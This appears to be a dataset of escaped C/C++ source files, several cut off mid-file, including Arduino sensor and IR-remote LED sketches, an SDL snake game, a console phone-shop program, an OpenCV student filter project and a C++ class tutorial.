rgbl_amod0(rgbl_pline.amod.lane<0>());\n\tvfloat rgbl_amod1(rgbl_pline.amod.lane<1>());\n\tvfloat rgbl_amod2(rgbl_pline.amod.lane<2>());\n\n\tvfloatacc l_errv = vfloatacc::zero();\n\tvfloat l_bs0(l_pline.bs.lane<0>());\n\tvfloat l_bs1(l_pline.bs.lane<1>());\n\tvfloat l_bs2(l_pline.bs.lane<2>());\n\n\tvint lane_ids = vint::lane_id();\n\tfor (unsigned int i = 0; i < texel_count",
    "#include <Arduino.h>\n\n// Version: 0.1.0\n\n// Distance sensor HC-SR04 pins\n#define distanceSensorTrigPin 12\n#define distanceSensorEchoPin 11\n\n// Relay control pin\n#define poweredOnDeviceTrigPin 6\n\n// Debounce and filtering settings\nconst long distanceInCmToPowerOn = 70; // Less than that will cause power on\nconst long maxValidDistanceCm = 120; // Less than that will cause power on\nconst int lastDistancesNumber = 20; // Number of distances kept to compare when debouncing\nconst int debounceTimeMs = 500; // Time in ms to collect lastDistancesNumber\nconst float requiredAccuracy = .7; // Fraction of required matched distances to change power state\n\nconst long initialDistanceCm = distanceInCmToPowerOn + 10;\nconst int delayBetweenMeasurements = round(debounceTimeMs / lastDistancesNumber);\n\nlong lastDistances[lastDistancesNumber];\nbool isPoweredOn = false;\n\nvoid setPower(bool enabled = false) {\n  if (enabled) {\n    digitalWrite(poweredOnDeviceTrigPin, LOW);\n  } else {\n    digitalWrite(poweredOnDeviceTrigPin, HIGH);\n  }\n}\n\nint getDistance() {\n  digitalWrite(distanceSensorTrigPin, LOW);\n  delayMicroseconds(2);\n  digitalWrite(distanceSensorTrigPin, HIGH);\n  delayMicroseconds(10);\n  digitalWrite(distanceSensorTrigPin, LOW);\n\n  int timeUs = pulseIn(distanceSensorEchoPin, HIGH);\n  return timeUs / 58;\n}\n\nvoid initDistances() {\n  for (int x = 0; x < lastDistancesNumber; x++) {\n    lastDistances[x] = initialDistanceCm;\n  }\n}\n\nvoid updateDistances(long distanceCm) {\n  // Copy array holding distances\n  long lastDistancesCopy[lastDistancesNumber] = {};\n  for (int x = 0; x < lastDistancesNumber; x++) {\n    lastDistancesCopy[x] = lastDistances[x];\n  }\n\n  // Update distances values\n  for (int x = 0; x < lastDistancesNumber - 1; x++) {\n    lastDistances[x] = lastDistancesCopy[x + 1];\n  }\n  lastDistances[lastDistancesNumber - 1] = distanceCm;\n}\n\nvoid setup() {\n  // Enable serial port for debugging\n  Serial.begin(9600);\n\n  // Init distance sensor\n  pinMode(distanceSensorTrigPin, OUTPUT);\n  pinMode(distanceSensorEchoPin, INPUT);\n\n  // Init powered on device\n  pinMode(poweredOnDeviceTrigPin, OUTPUT);\n  digitalWrite(poweredOnDeviceTrigPin, LOW);\n\n  initDistances();\n}\n\n/*\n * powerOn = true; verify is acccuracy matched for toggling power on\n * powerOff = false; verify is acccuracy matched for toggling power off\n */\nbool isAccuracyMatchingCriteriaTo(bool powerOn = true) {\n  // Get number of ok and failed checks\n  int checksOk = 0;\n  int checksFailed = 0;\n  for (int x = 0; x < lastDistancesNumber; x++) {\n    if (lastDistances[x] <= distanceInCmToPowerOn) {\n      checksOk++;\n    } else {\n      checksFailed++;\n    }\n  }\n\n  float checksPart;\n\n  // Verify against configured accuracy\n  if (powerOn) {\n    checksPart = (float) checksOk / (float) (checksOk + checksFailed);\n  } else {\n    checksPart = (float) checksFailed / (float) (checksOk + checksFailed);\n  }\n\n  // Return true if accuracy met, otherwise false\n  if (checksPart >= requiredAccuracy) {\n    return true;\n  }\n  return false;\n}\n\nvoid loop() {\n  long distanceCm = getDistance();\n\n  if (distanceCm > 0 && distanceCm < maxValidDistanceCm) {\n    updateDistances(distanceCm);\n\n    if (isPoweredOn && isAccuracyMatchingCriteriaTo(false)) {\n      isPoweredOn = false;\n    } else if (!isPoweredOn && isAccuracyMatchingCriteriaTo(true)) {\n      isPoweredOn = true;\n    }\n  }\n\n  Serial.print(\"State: \");\n  Serial.print(isPoweredOn ? \"ON\" : \"OFF\");\n  Serial.print(\"; Distance[cm]: \");\n  Serial.println(distanceCm);\n\n  setPower(isPoweredOn);\n\n  delay(delayBetweenMeasurements);\n}\n",
    "#include <iostream>\n#include <string>\n#include <fstream>\n\nusing namespace std;\n\nclass mobile_phone{\n   public:\n   mobile_phone(int price , string name){\n   cout<<\"<-----------Invoices----------->\"<<endl;  \n   cout<<endl; \n   cout<<\"$ Generic Name : Mobile Phone\"<<endl;\n   cout<<\"$ Model Name : \"<<name<<endl;\n   cout<<\"$ Maximum Retail Price : \"<<(price + ((price)*0.1))<<\" /-\"<<endl;\n   cout<<\"$ Month And Year Of Manufacturering : April 2024\"<<endl;\n   cout<<\"$ Telephone : 7030570988\"<<endl;\n   cout<<\"$ Email : chavanyash127@gmail.com\"<<endl;\n   cout<<\"$ Website : www.ycshop.xyz\"<<endl;\n  }\n};\n\nvoid Show_Mobile_List(void);\nvoid choose_Mobile_brand(void);\nvoid apple_mobile_series(void);\nvoid samsung_mobile_series(void);\nvoid vivo_mobile_series(void);\nvoid oppo_mobile_series(void);\nvoid oneplus_mobile_series(void);\n\n\nvoid base_model(void);\nvoid plus_model(void);\nvoid pro_model(void);\nvoid pro_max_model(void);\n\nvoid sa_series(void);\nvoid m_series(void);\nvoid sf_series(void);\nvoid s_series(void);\n\nvoid v_series(void);\nvoid y_series(void);\nvoid t_series(void);\nvoid x_series(void);\n\nvoid of_series(void);\nvoid oa_series(void);\nvoid find_series(void);\nvoid reno_series(void);\n\nvoid best_series(void);\nvoid nord_series(void);\n\nvoid userData(int,string);\n\n\n\nint main(){\n\n char startValue; \n\n cout<<\"$ Please Press s To Start Purchase Mobile.\"<<endl;\n start:\n cout<<\"Input Here : \" ; \n cin>>startValue;\n\n\n if(startValue =='s' || startValue == 'S'){\n     Show_Mobile_List();\n}\n\n else{\n      cout<<\"$ Fail To Start Purchasing Please Press s To Start Purchase Mobile.\"<<endl;\n      goto start;\n}\n\n  return 0;\n\n}\n\nvoid Show_Mobile_List(void){\n     cout <<endl;\n     cout<<\"#####  Welcome To YC Shop | We Have Top 5 Mobile Brands  #####\"<<endl;\n     cout<<endl;\n     cout<<\"1. Apple\"<<endl;\n     cout<<\"2. Samsung\"<<endl;\n     cout<<\"3. Vivo\"<<endl;\n     cout<<\"4. Oppo\"<<endl;\n     cout<<\"5. Oneplus\"<<endl;\n     cout<<endl;\n\n     choose_Mobile_brand();\n}\n\n\n\nvoid choose_Mobile_brand(){\n     cout<<\"$ Choose A Mobile Brand. [Enter Number ex. For Samsung --> 2]\"<<endl;\n     cout<<endl;\n     char brand;\n     cout<<\"Input Here : \";\n     cin>>brand;\n   \n\n     switch (brand){\n\n     case '1':\n      apple_mobile_series();\n        break;\n\n     case '2':\n       samsung_mobile_series(); \n        break;\n\n     case '3':\n      vivo_mobile_series();\n        break;\n\n     case '4':\n       oppo_mobile_series(); \n        break;\n\n     case '5':\n      oneplus_mobile_series();\n        break;   \n     \n     default:\n       cout<<endl;\n       cout<<\"$ Fail To Choose A Mobile Brand.\"<<endl;\n       choose_Mobile_brand();\n      break;\n\n     }\n}\n\nvoid apple_mobile_series(){\n   cout<<endl;\n   cout<<\"$ Thats Great To Choose Apple.\"<<endl;\n   cout<<endl;\n   cout<<\"1. Base Model\"<<endl;\n   cout<<\"2. Plus Model\"<<endl;\n   cout<<\"3. Pro Model\"<<endl;\n   cout<<\"4. Pro Max Model\"<<endl;\n   cout<<endl;\n   cout<<\"$ Choose The Series \"<<endl;\n   cout<<endl;\n   char apple;\n   cout<<\"Input Here : \";\n   cin>>apple;\n\n  switch (apple){\n\n     case '1':\n     base_model();\n        break;\n\n     case '2':\n      plus_model();\n        break;\n\n     case '3':\n      pro_model();\n        break;\n\n     case '4':\n      pro_max_model();\n        break;\n\n     default:\n       cout<<endl;\n       cout<<\"$ Fail To Choose A Mobile Series.\"<<endl;\n      apple_mobile_series();\n      break;\n\n     }\n\n}    \n\n void samsung_mobile_series(){\n   cout<<endl;\n   cout<<\"$ Thats Great To Choose Samsung.\"<<endl;\n   cout<<endl;\n   cout<<\"1. A Series\"<<endl;\n   cout<<\"2. M Series\"<<endl;\n   cout<<\"3. F Series\"<<endl;\n   cout<<\"4. S Series\"<<endl;\n   cout<<endl;\n   cout<<\"$ Choose The Series \"<<endl;\n   cout<<endl;\n   char samsung;\n   cout<<\"Input Here : \";\n   cin>>samsung;\n\nswitch (samsung){\n\n     case '1':\n     sa_series();\n        break;\n\n     case '2':\n     m_series();\n        break;\n\n     case '3':\n     sf_series();\n        break;\n\n     case '4':\n     s_series();\n        break;\n\n     default:\n       cout<<endl;\n       cout<<\"$ Fail To Choose A Mobile Series.\"<<endl;\n      samsung_mobile_series();\n      break;\n\n     }\n }\n\nvoid vivo_mobile_series(){\n   cout<<endl;\n   cout<<\"$ Thats Great To Choose Vivo.\"<<endl;\n   cout<<endl;\n   cout<<\"1. V Series\"<<endl;\n   cout<<\"2. Y Series\"<<endl;\n   cout<<\"3. T Series\"<<endl;\n   cout<<\"4. X Series\"<<endl;\n   cout<<endl;\n   cout<<\"$ Choose The Series \"<<endl;\n   cout<<endl;\n   char vivo;\n   cout<<\"Input Here : \";\n   cin>>vivo;\n\n\nswitch (vivo){\n\n     case '1':\n     v_series();\n        break;\n\n     case '2':\n     y_series();\n        break;\n\n     case '3':\n     t_series();\n        break;\n\n     case '4':\n     x_series();\n        break;\n\n     default:\n       cout<<endl;\n       cout<<\"$ Fail To Choose A Mobile Series.\"<<endl;\n      vivo_mobile_series();\n      break;\n\n     }\n\n}\n\nvoid oppo_mobile_series(){\n   cout<<endl;\n   cout<<\"$ Thats Great To Choose Oppo.\"<<endl;\n   cout<<endl;\n   cout<<\"1. F Series\"<<endl;\n   cout<<\"2. A Series\"<<endl;\n   cout<<\"3. Find series\"<<endl;\n   cout<<\"4. Re",
    "#include <SDL.h>\r\n#include <SDL_image.h>\r\n#include <SDL_ttf.h>\r\n#include <SDL_mixer.h>\r\n#include <iostream>\r\n#include <vector>\r\n#include <ctime>\r\n\r\nusing namespace std;\r\n\r\nstruct Point {\r\n    int x, y;\r\n};\r\n\r\nenum GameState {\r\n    START_SCREEN,\r\n    PLAYING,\r\n    GAME_OVER\r\n};\r\n\r\nclass SnakeGame {\r\nprivate:\r\n    SDL_Window* window;\r\n    SDL_Renderer* renderer;\r\n    SDL_Texture* backgroundTexture;\r\n    SDL_Texture* startTexture;\r\n    SDL_Texture* gameOverTexture;\r\n    TTF_Font* font;\r\n    SDL_Color textColor;\r\n    SDL_Texture* scoreTexture;\r\n    SDL_Texture* yourScoreTexture;\r\n    int score;\r\n    vector<Point> snake;\r\n    Point fruit;\r\n    int gridSize;\r\n    int direction;\r\n    bool running;\r\n    GameState gameState;\r\n    Mix_Music* backgroundMusic;\r\n    Mix_Chunk* changeDirectionSound;\r\n    Mix_Chunk* gameOverSound;\r\n\r\npublic:\r\n    SnakeGame() {\r\n        srand(time(0));\r\n        SDL_Init(SDL_INIT_VIDEO | SDL_INIT_AUDIO);\r\n        IMG_Init(IMG_INIT_PNG);\r\n        TTF_Init();\r\n        Mix_OpenAudio(44100, MIX_DEFAULT_FORMAT, 2, 2048);\r\n        window = SDL_CreateWindow(\"Snake Game\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 640, 480, SDL_WINDOW_SHOWN);\r\n        renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);\r\n        gridSize = 20;\r\n        direction = 1;\r\n        running = true;\r\n        gameState = START_SCREEN;\r\n        score = 0;\r\n        textColor = {255, 255, 255, 255};\r\n        snake.push_back({10, 10});\r\n        spawnFruit();\r\n\r\n        SDL_Surface* backgroundSurface = IMG_Load(\"background.jpg\");\r\n        if (!backgroundSurface) {\r\n            cout << \"Failed to load background image: \" << IMG_GetError() << endl;\r\n        } else {\r\n            backgroundTexture = SDL_CreateTextureFromSurface(renderer, backgroundSurface);\r\n            SDL_FreeSurface(backgroundSurface);\r\n        }\r\n\r\n        SDL_Surface* startSurface = IMG_Load(\"start.png\");\r\n        if (!startSurface) {\r\n            cout << \"Failed to load start screen image: \" << IMG_GetError() << endl;\r\n        } else {\r\n            startTexture = SDL_CreateTextureFromSurface(renderer, startSurface);\r\n            SDL_FreeSurface(startSurface);\r\n        }\r\n        SDL_Surface* gameOverSurface = IMG_Load(\"gameover.png\");\r\n        if (!gameOverSurface) {\r\n            cout << \"Failed to load game over image: \" << IMG_GetError() << endl;\r\n        } else {\r\n            gameOverTexture = SDL_CreateTextureFromSurface(renderer, gameOverSurface);\r\n            SDL_FreeSurface(gameOverSurface);\r\n        }\r\n        font = TTF_OpenFont(\"ARIALBD1.ttf\", 24);\r\n        if (!font) {\r\n            cout << \"Failed to load font: \" << TTF_GetError() << endl;\r\n        }\r\n\r\n        backgroundMusic = Mix_LoadMUS(\"music.mp3\");\r\n        if (!backgroundMusic) {\r\n            cout << \"Failed to load background music: \" << Mix_GetError() << endl;\r\n        } else {\r\n            Mix_PlayMusic(backgroundMusic, -1);\r\n        }\r\n\r\n        changeDirectionSound = Mix_LoadWAV(\"move.mp3\");\r\n        if (!changeDirectionSound) {\r\n            cout << \"Failed to load change direction sound: \" << Mix_GetError() << endl;\r\n        }\r\n\r\n        gameOverSound = Mix_LoadWAV(\"gameover.mp3\");\r\n        if (!gameOverSound) {\r\n            cout << \"Failed to load game over sound: \" << Mix_GetError() << endl;\r\n        }\r\n    }\r\n\r\n    ~SnakeGame() {\r\n        SDL_DestroyTexture(backgroundTexture);\r\n        SDL_DestroyTexture(startTexture);\r\n        SDL_DestroyTexture(gameOverTexture);\r\n        SDL_DestroyTexture(scoreTexture);\r\n        SDL_DestroyTexture(yourScoreTexture);\r\n        Mix_FreeMusic(backgroundMusic);\r\n        Mix_FreeChunk(changeDirectionSound);\r\n        Mix_FreeChunk(gameOverSound);\r\n        TTF_CloseFont(font);\r\n        SDL_DestroyRenderer(renderer);\r\n        SDL_DestroyWindow(window);\r\n        Mix_CloseAudio();\r\n        TTF_Quit();\r\n        IMG_Quit();\r\n        SDL_Quit();\r\n    }\r\n\r\n    void spawnFruit() {\r\n        fruit.x = rand() % (640 / gridSize);\r\n        fruit.y = rand() % (480 / gridSize);\r\n    }\r\n\r\n    void handleInput() {\r\n        SDL_Event event;\r\n        while (SDL_PollEvent(&event)) {\r\n            if (event.type == SDL_QUIT) {\r\n                running = false;\r\n            } else if (event.type == SDL_KEYDOWN) {\r\n                if (gameState == START_SCREEN || gameState == GAME_OVER) {\r\n                    if (event.key.keysym.sym == SDLK_SPACE) {\r\n                        resetGame();\r\n                        gameState = PLAYING;\r\n                    }\r\n                } else {\r\n                    switch (event.key.keysym.sym) {\r\n                        case SDLK_UP:\r\n                            if (direction != 2) {\r\n                                direction = 0;\r\n                                Mix_PlayChannel(-1, changeDirectionSound, 0);\r\n                            }\r\n                            break;\r\n                        case SDLK_RIGHT:\r\n                            if (direction != 3) {\r\n                                direction = 1;\r\n      ",
    "// Aggiunzione delle librerie\n#include <Wire.h>\n#include <Arduino.h>\n#include <IRremote.h>\n#include <LiquidMenu.h>\n#include <LiquidCrystal_I2C.h>\n\n// Definisci i pin per i LED\n#define LED1 3\n#define LED2 4\n#define LED3 5\n\nunsigned long button; // Variabile per memorizzare il codice del pulsante premuto\nint led_selected = 0;\nbool is_selected_all_leds = false;\n\n// Dichiarazione delle funzioni\nunsigned long read();\n\nvoid back();\nvoid select_led(int led);\n\nvoid select_led_1();\nvoid select_led_2();\nvoid select_led_3();\nvoid select_all_leds();\n\nvoid turn_on_led();\nvoid turn_off_led();\n\n// Inizializza il display LCD I2C con l'indirizzo 0x27 e una dimensione di 16x2\nLiquidCrystal_I2C lcd(0x27, 16, 2);\n\n// Definisci le linee del menu\nLiquidLine line_0_0(1, 0, \"LED 1\");\nLiquidLine line_0_1(1, 1, \"LED 2\");\nLiquidLine line_0_2(1, 0, \"LED 3\");\nLiquidLine line_0_3(1, 1, \"TUTTI\");\nLiquidScreen screen_0(line_0_0, line_0_1, line_0_2, line_0_3);\n\nLiquidLine line_1_0(1, 0, \"ACCENDERE\");\nLiquidLine line_1_1(1, 1, \"SPEGNERE\");\nLiquidLine line_1_2(1, 0, \"INDIETRO\");\nLiquidScreen screen_1(line_1_0, line_1_1, line_1_2);\n\n// Crea il menu con le schermate definite\nLiquidMenu menu(lcd, screen_0, screen_1);\n\nvoid setup() {\n  Serial.begin(9600); // Inizializza la comunicazione seriale\n  IrReceiver.begin(2); // Inizializza il ricevitore IR sul pin 2\n\n  // Imposta i pin dei LED come output\n  pinMode(LED1, OUTPUT);\n  pinMode(LED2, OUTPUT);\n  pinMode(LED3, OUTPUT);\n  \n  lcd.init(); // Inizializza il display LCD\n  lcd.backlight(); // Attiva la retroilluminazione del display\n\n  menu.init(); // Inizializza il menu\n  \n  // Configura le linee del menu con le funzioni di callback\n  line_0_0.set_focusPosition(Position::LEFT);\n  line_0_0.attach_function(1, select_led_1);\n  line_0_1.set_focusPosition(Position::LEFT);\n  line_0_1.attach_function(1, select_led_2);\n  line_0_2.set_focusPosition(Position::LEFT);\n  line_0_2.attach_function(1, select_led_3);\n  line_0_3.set_focusPosition(Position::LEFT);\n  line_0_3.attach_function(1, select_all_leds);\n\n  line_1_0.set_focusPosition(Position::LEFT);\n  line_1_0.attach_function(1, turn_on_led);\n  line_1_1.set_focusPosition(Position::LEFT);\n  line_1_1.attach_function(1, turn_off_led);\n  line_1_2.set_focusPosition(Position::LEFT);\n  line_1_2.attach_function(1, back);\n\n  // Aggiungi le schermate al menu\n  menu.add_screen(screen_0);\n  menu.add_screen(screen_1);\n\n  screen_0.set_displayLineCount(2);  \n  screen_1.set_displayLineCount(2);\n\n  menu.set_focusedLine(0); // Imposta la linea iniziale del menu\n  menu.update(); // Aggiorna il display del menu\n}\n\nvoid loop() {\n  button = read(); // Legge il codice del pulsante premuto tramite il ricevitore IR\n\n  // Controlla il pulsante premuto e aggiorna il menu di conseguenza\n  if(button == 4077686656) { // Codice per spostare il focus verso l'alto\n    menu.switch_focus(false);\n    menu.update();\n  }\n\n  if(button == 4044263296) { // Codice per spostare il focus verso il basso\n    menu.switch_focus(true);\n    menu.update();\n  }\n\n  if(button == 3994128256) { // Codice per selezionare la voce del menu\n    menu.call_function(1);\n    delay(250); // Ritardo per evitare letture multiple del pulsante\n  }\n\n  delay(100); // Ritardo per il loop principale\n}\n\nunsigned long read() {  \n  unsigned long result = 0;  \n  if (IrReceiver.decode() == 1) {    \n    unsigned long code = IrReceiver.decodedIRData.decodedRawData;        \n    result = code;    \n    IrReceiver.resume(); // Riprende la ricezione IR\n  }\n  \n  return result;\n}\n\n// Funzioni per selezionare il LED\nvoid select_led(int led) {  \n  menu.change_screen(2); // Cambia alla schermata delle azioni (accendere/spegnere)\n  menu.set_focusedLine(0);\n  led_selected = led; // Memorizza il LED selezionato\n  is_selected_all_leds = false; // Imposta che non sono selezionati tutti i LED\n}\n\nvoid back() {\n  menu.change_screen(1); // Torna alla schermata principale del menu\n  menu.set_focusedLine(0);\n}\n\nvoid select_led_1() {\n  select_led(LED1); // Seleziona il LED 1\n}\n\nvoid select_led_2() {\n  select_led(LED2); // Seleziona il LED 2\n}\n\nvoid select_led_3() {\n  select_led(LED3); // Seleziona il LED 3\n}\n\nvoid select_all_leds() {\n  menu.change_screen(2); // Cambia alla schermata delle azioni\n  menu.set_focusedLine(0);\n  is_selected_all_leds = true; // Imposta che sono selezionati tutti i LED\n}\n\nvoid turn_on_led() {\n  if(is_selected_all_leds == true) {    \n    digitalWrite(LED1, HIGH); // Accende tutti i LED\n    digitalWrite(LED2, HIGH);\n    digitalWrite(LED3, HIGH);\n    return;\n  }\n\n  // Accende il LED selezionato\n  switch (led_selected) {\n    case LED1:\n      digitalWrite(LED1, HIGH);\n      break;\n    case LED2:\n      digitalWrite(LED2, HIGH);\n      break;\n    case LED3:\n      digitalWrite(LED3, HIGH);\n      break;\n\n   return;\n  }\n}\n\nvoid turn_off_led() {\n  if(is_selected_all_leds == true) {  \n    digitalWrite(LED1, LOW); // Spegne tutti i LED\n    digitalWrite(LED2, LOW);\n    digitalWrite(LED3, LOW);\n    return;\n  }\n\n  // Spegne il LED selezionato\n  swit",
    "/*\n  Tejasri Kasturi & Veditha Gudapati\n  01/26/2024\n  Spring 2024\n  CS 5330 Computer Vision\n\n  Process video frames using different visual effects\n*/\n\n#include <opencv2/opencv.hpp>\n#include <iostream>\n#include \"filter.hpp\" \n#include \"faceDetect.h\"\n#include \"vidDisplay.h\"\n#include <string>\n\ndouble currentBrightness = 1.0;  // Initial brightness value\ndouble currentContrast = 1.0;    // Initial contrast value\n\nvoid updateBrightnessContrast(cv::Mat& inputFrame, cv::Mat& outputFrame, double brightness, double contrast) {\n    inputFrame.convertTo(outputFrame, -1, contrast, brightness);\n}\n\n\nvoid addCaption(cv::Mat& frame, const std::string& caption, int x, int y, double fontScale, cv::Scalar color) {\n    cv::putText(frame, caption, cv::Point(x, y), cv::FONT_HERSHEY_SIMPLEX, fontScale, color, 2);\n}\n\nvoid addCaptionOnSave(cv::Mat& frame, const std::string& caption, int x, int y, double fontScale, cv::Scalar textColor, cv::Scalar bgColor) {\n    // Get the size of the text box\n    int baseline = 0;\n    cv::Size textSize = cv::getTextSize(caption, cv::FONT_HERSHEY_SIMPLEX, fontScale, 2, &baseline);\n\n    // Draw a filled rectangle as the background\n    cv::rectangle(frame, cv::Point(x, y - textSize.height), cv::Point(x + textSize.width, y), bgColor, -1);\n\n    // Add text on top of the filled rectangle\n    cv::putText(frame, caption, cv::Point(x, y), cv::FONT_HERSHEY_SIMPLEX, fontScale, textColor, 2);\n}\n\n// Function to get a caption from the user\nstd::string getUserCaption() {\n    std::string caption; // Declare a string variable to store the user's input\n    std::cout << \"Enter caption (press Enter to skip): \"; // Prompt the user to enter a caption\n    std::getline(std::cin, caption);     // Read a line of text from the standard input (keyboard) and store it in the 'caption' variable\n    return caption;  // Return the user-provided caption\n}\n\n// Function to toggle the keepStrongColor effect\n//int keepStrongColor(cv::Mat &frame, cv::Mat &outputFrame, bool &isEnabled, uchar threshold = 128);\n\nint main(int argc, char *argv[])\n{\n  cv::VideoCapture *capdev;\n\n  // Open the video device\n  capdev = new cv::VideoCapture(0);\n  if (!capdev->isOpened())\n  {\n    printf(\"Unable to open video device\\n\");\n    return (-1);\n  }\n\n  // Get some properties of the image\n  cv::Size refS((int)capdev->get(cv::CAP_PROP_FRAME_WIDTH),\n                (int)capdev->get(cv::CAP_PROP_FRAME_HEIGHT));\n  printf(\"Expected size: %d %d\\n\", refS.width, refS.height);\n\n  cv::namedWindow(\"Video\", 1); // Identify a window\n  cv::Mat frame, greyFrame;\n  std::vector<cv::Rect> faces; // Add this line for face detection\n\n  cv::Mat sobelXFrame, sobelYFrame, gradientMagnitudeFrame; // Add gradientMagnitudeFrame\n  char lastKey = ' ';                                       // To store the last key pressed\n\n  cv::Mat quantizedFrame;      // Add a new Mat for quantized frame\n  int quantizationLevels = 10; // Default quantization levels\n\n  cv::Mat embossedFrame; // Add a new Mat for the embossed frame\n\n  bool addCaptionMode = false;  // Flag to indicate whether the user is adding a caption\n  bool applyVignetting = false; // Flag to determine whether to apply vignetting\n\n  // void keepStrongColor(cv::Mat& src, cv::Mat& dst, cv::Scalar color); // Function to keep a specific color and set everything else to greyscale\n  \n  for (;;)\n  {\n    *capdev >> frame; // Capture a frame from the video device.\n\n    // Check if the captured frame is empty.\n    if (frame.empty())\n    {\n      printf(\"frame is empty\\n\");\n      break;\n    }\n\n    // Check the value of the last key pressed and perform corresponding actions.\n    if (lastKey == 'g')\n    {\n      // Convert the frame to greyscale.\n      cv::cvtColor(frame, greyFrame, cv::COLOR_BGR2GRAY);\n      // Add a caption to the greyscale frame.\n      addCaption(greyFrame, \"Greyscale\", 10, 30, 1.0, cv::Scalar(0, 0, 0));\n      // Display the greyscale frame.\n      cv::imshow(\"Video\", greyFrame);\n    }\n    else if (lastKey == 'h')\n    {\n      // Convert the frame to an alternate greyscale.\n      greyscale(frame, greyFrame);\n      // Add a caption to the alternate greyscale frame.\n      addCaption(greyFrame, \"Alternate_Greyscale\", 10, 30, 1.0, cv::Scalar(0, 0, 0));\n      // Display the alternate greyscale frame.\n      cv::imshow(\"Video\", greyFrame);\n      \n    } else if (lastKey == 'p') {   \n      // If the user pressed 'p', apply sepia effect to the frame\n      sepia(frame, greyFrame);\n      // Add a caption \"Sepia\" to the frame at position (10, 30) with scale 1.0 and black color\n      addCaption(greyFrame, \"Sepia\", 10, 30, 1.0, cv::Scalar(0, 0, 0));\n      // Display the modified frame with the sepia effect  \n      cv::imshow(\"Video\", greyFrame);\n    } else if (lastKey == 'p') {\n      // If the user pressed 'v', toggle the vignetting flag\n      sepia(frame, greyFrame);\n      addCaption(greyFrame, \"Sepia\", 10, 30, 1.0, cv::Scalar(0, 0, 0));\n      cv::imshow(\"Video\", greyFrame);\n    } else if (lastKey == 'v') {\n            applyVignetting = !applyV",
    "#include <iostream>\n#include <vector>\n\n\nclass Student\t\t\t\t\t\t\t//class declaration\n{\n\tstd::string m_firstname = \"First\";\t//these are private\n\tstd::string m_lastname = \"Name\";\n\tint\t\t\tm_id\t= 0;\n\tfloat\t\tm_avg\t= 0;\npublic:\n\tStudent()\t{}\t\t\t\t\t\t//default constructor\n\n\tStudent(std::string firstname, std::string lastname, int id, float avg) //parameterized constructor\n\t\t: m_firstname\t(firstname)\n\t\t, m_lastname\t(lastname)\n\t\t, m_id\t\t\t(id)\n\t\t, m_avg\t\t\t(avg)\n\t{\n\t}\n\t\t\t\t\t\t\t\t\t\t//getters and setters\n\tfloat getAvg()\t\t\t\t\t\t\n\t{\n\t\treturn m_avg;\n\t}\n\n\tint getID()\n\t{\n\t\treturn m_id;\n\t}\n\n\tstd::string getFirst()\n\t{\n\t\treturn m_firstname;\n\t}\n\n\tstd::string getLast()\n\t{\n\t\treturn m_firstname;\n\t}\n\n\tvoid setAvg(float avg)\n\t{\n\t\tm_avg = avg;\n\t}\n\n\tvoid setID(int id)\n\t{\n\t\tm_id = id;\n\t}\n\n\tvoid setFirst(std::string firstname)\n\t{\n\t\tm_firstname = firstname;\n\t}\n\n\tvoid setLast(std::string lastname)\n\t{\n\t\tm_lastname = lastname;\n\t}\n\n\tvoid print() const\n\t{\n\t\tstd::cout << m_firstname << \" \" << m_lastname << \" \";\n\t\tstd::cout << m_id << \" \" << m_avg << \"\\n\";\n\t}\n};\n/*\nvoid doMachineLearning(const Data& d) //declared as const to ensure that it will not change\n{\n\td.getValue()\n}\n*/\n\nclass Course\n{\n\tstd::string m_name = \"Course\";\n\tstd::vector<Student> m_students;\npublic:\n\tCourse(){}\n\tCourse(const std::string& name)\t\t//string& passes a reference to a string, instead of copying it\n\t\t:m_name(name)\t\t\t\t\t// const so the name doesnt change\n\t{\n\t}\n\n\tvoid addStudent(const Student& s)\n\t{\n\t\tm_students.push_back(s);\n\t}\n\n\tconst std::vector<Student>& getStudents() const\t\t//the first const = means what we are returning cannot change\n\t{\t\t\t\t\t\t\t\t\t\t\t\t\t//second const means getStudents will not change the class\n\t\treturn m_students;\n\t}\n\n\tvoid pring() const\n\t{\n\t\tfor (const auto& s : m_students)\n\t\t{\n\t\t\ts.print();\n\t\t}\n\t}\n};\n\nint main(int argc, char* argv[])\n{\n\t\n\t/*\n\t std::cout << \"Hello World!\" << std::endl;\n\tint a = 42;\n\tint b = 10;\n\n\tstd::cout << a << b << \"\\n\";\t\t//concatenated\n\tstd::cout << a + b << std::endl;\t//added\n\n\tstd::vector<int> vec;\t\t\t\t//vector declaration\n\tvec.push_back((a));\t\t\t\t\t//putting value inside a vector\n\tvec.push_back(b);\n\tvec.push_back(99);\n\n\t\t\t\t\t\t\t\t\t\t//go through vector manually.\n\tstd::cout << vec[0] << \"\\n\";\t\t//prints 42\n\tstd::cout << vec[1] << \"\\n\";\t\t//prints 10\n\tstd::cout << vec[2] << \"\\n\";\t\t//prints 99\n\tstd::cout << vec[3] << \"\\n\";\t\t//prints whatever was in the memory at that location\n\t\t\t\t\t\t\t\t\t\t//unlike arrays, vectors don't check if you gave it a new value\n\n\n\tfor(size_t i = 0; i<vec.size(); i++) //\"size_t\" instead of just \"int\" is used because vec.size() gives unsigned int\n\t{\t\t\t\t\t\t\t\t\t //logical error might occur when comparing signed to unsigned\t\t\t\t\t\n\t\tstd::cout << vec[i] << \"\\n\";\n\t}\n\n\n\tfor(int i : vec)\t\t\t\t\t//iterates through vector (for every integer in vector)\n\t{\n\t\tstd::cout << i << \"\\n\";\n\t}\n\n\tfloat c = 1.1f;\t\t\t\t\t\t//float declaration\n\n\tstd::vector<float> vec_float;\t\t\n\tvec_float.push_back((c));\n\tvec_float.push_back(9.9f);\n\n\tfor (int i : vec_float)\t\t\t\t//converts float into into before printing\n\t{\n\t\tstd::cout << i << \"\\n\";\t\t\t//prints 1, 9\n\t}\n\n\tfor (auto a : vec_float)\t\t//does type inference for you.\n\t{\n\t\tstd::cout << a << \"\\n\";\t\t\t//prints 1.1, 9.9\n\t}\n\n\t*/\n\n\tStudent s1;\n\tStudent s2(\"Rian\", \"Punzalan\", 1, 95.1f);\n\tconst Student s3(\"Celine\", \"Ang\", 2, 100.0f);\t//notice the const, meaning you dont want this object to change\n\n\tCourse comp4300(\"Comp 4300\");\n\n\ts1.print();\n\n\ts2.print();\n\ts2.setFirst(\"Rian Karlo\");\n\ts2.print();\n\n\ts3.print();\t\t\t\t\t\t\t//calling a non-const function on a const object will give a compiler error.\n\t\t\t\t\t\t\t\t\t\t//solution: put a const on the function\n\n\tstd::vector<Student> vec_students;\t//create a vector of type Student and populate 